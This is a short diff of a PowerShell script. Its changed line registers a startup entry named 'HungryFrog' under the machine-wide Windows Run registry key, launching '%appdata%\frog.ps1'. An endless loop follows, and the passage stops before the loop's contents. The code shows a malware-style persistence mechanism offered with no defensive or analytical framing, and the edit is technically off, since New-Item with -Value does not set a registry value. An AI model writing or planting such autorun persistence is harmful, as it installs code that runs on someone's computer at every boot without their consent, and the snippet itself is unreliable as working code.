@@ -1,4 +1,4 @@
-Set-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Run" -name "HungryFrog" -Value "%appdata%\\frog.ps1";
+New-Item -Path "Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Run" -name "HungryFrog" -Value "%appdata%\\frog.ps1";
 
 while(1 -eq 1)
 {
